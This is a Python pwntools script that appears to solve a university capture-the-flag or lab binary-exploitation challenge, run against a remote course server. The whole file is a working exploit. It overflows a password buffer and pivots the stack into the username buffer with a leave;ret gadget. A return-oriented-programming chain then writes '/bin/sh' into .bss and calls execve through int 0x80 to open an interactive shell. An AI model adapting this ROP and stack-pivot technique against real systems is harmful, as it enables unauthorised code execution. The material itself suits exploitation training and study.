from pwn import *

context.arch = 'i386'
context.os = 'linux'
# context.log_level = 'debug'
context.terminal = ['tmux', 'new-window']

# P = gdb.debug('./bin', '''b* main+73
                # b *authenticate_user + 63
                # b *authenticate_user + 143
                # c
                # ''')
P = process('./bin')
P = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10107)

elf = ELF("./bin")

bssAddress = elf.get_section_by_name('.bss').header.sh_addr

#username in  0x08048ae4 <+66>:    lea    eax,[ebx+0xfa0]
#  EBX  0x80eb000 (_GLOBAL_OFFSET_TABLE_) ◂— 0

sPass = 0xffffcd40
sRip = 0xffffcdcc
offset = sRip - sPass

# 0x080481ba : ret
justRet = 0x080481ba

#0x080b9722 : mov esp, ecx ; ret
movEspEcx = 0x080b9722

# 0x08064d68 : push edx ; ret
pushEdx = 0x08064d68

#0x0807009a : pop edx ; ret
popEdx = 0x0807009a

# 0x080700c1 : pop ecx ; pop ebx ; ret
popEcxPopEbx = 0x080700c1

usernameAddrs = 0x80ebfa0

# 0x080b94f6 : pop eax ; ret
popEax = 0x080b94f6

# 0x08055a9b : mov dword ptr [edx], eax ; ret
movDwordPtrEdxEax = 0x08055a9b

# 0x0806dc75 : int 0x80
int80 = 0x0806dc75

# 0x080d74be : add ecx, dword ptr [edx] ; ret
addEcxDwordPtrEdx = 0x080d74be

#0x080498d3 : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret

# 0x080488e8 : leave ; ret
leave = 0x080488e8


binSh1 = b"/bin"
binSh2 = b"/sh\x00"

payloadPivot = b"A" * (offset - 4) + p32(usernameAddrs - 4) # ebp minus 4 to avoid the leave instruction to pop the address wrong
payloadPivot += p32(leave)


payloadShell = p32(popEdx) + p32(bssAddress) + p32(popEax) + binSh1 + p32(movDwordPtrEdxEax) + p32(popEdx) + p32(bssAddress + 4) + p32(popEax) + binSh2 + p32(movDwordPtrEdxEax)
payloadShell += p32(popEcxPopEbx) + p32(0) + p32(bssAddress) + p32(popEdx) + p32(0) + p32(popEax) + p32(0xb) + p32(int80)

P.sendline(payloadShell)
P.sendline(payloadPivot)
P.interactive()

print(hex(offset))
print(hex(148 - offset))

print(hex(162))
print(hex(len(payloadPivot)))
